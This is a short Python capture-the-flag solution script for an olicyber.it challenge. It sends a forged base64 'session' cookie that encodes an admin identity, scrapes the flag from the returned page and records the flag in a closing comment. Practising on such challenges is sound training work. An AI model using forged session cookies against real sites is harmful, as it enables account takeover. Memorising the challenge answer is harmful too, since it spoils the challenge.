import requests
import re

site = "http://cma.challs.olicyber.it/"

cookie = {
    "session" : "MjAyNS8wNy8xNi0xNzUyNjYzNjg2LWFkbWlu"
}

r = requests.get(f"{site}/home.php", cookies=cookie).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{c00ki3_4rmy_will_c0nqu3r_th3_w0rld!}
